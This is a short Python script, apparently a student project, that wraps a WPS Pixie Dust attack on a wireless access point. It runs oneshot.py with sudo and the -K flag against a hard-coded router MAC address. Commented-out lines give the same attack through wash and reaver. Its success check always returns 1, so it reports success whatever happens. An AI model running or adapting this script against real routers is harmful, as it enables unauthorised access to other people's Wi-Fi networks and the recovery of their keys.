import os
import subprocess as sub
import time
import signal
import psutil
from subprocess import check_call

def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.send_signal(signal.SIGINT)
    process.kill()

def pixie():
    print("Attempting PixieDust")
    # order = "sudo wash -i wlan0mon"
    # geny  = os.system(order)
    # order = "sudo reaver -i wlan0mon -b F4:F2:6D:3C:40:92 -c 1 -vvv -l 1 -K 1 -f"
    # order = "sudo /usr/bin/python3 /frostbite/Desktop/MinorProject/Code/oneshot.py -i wlan0 -b C4:E9:0A:CD:AD:07 -K"
    proc = sub.Popen("sudo /usr/bin/python3 /frostbite/Desktop/MinorProject/Code/oneshot.py -i wlan0 -b C4:E9:0A:CD:AD:07 -K".split())
    
    try:
        proc.wait(timeout=30)
    except sub.TimeoutExpired:
        print("Unable to associate with AP")    
        print("exiting")
        kill(proc.pid)
      
    if proc.pid >= 1:
        return 1   
    else:
        return 0

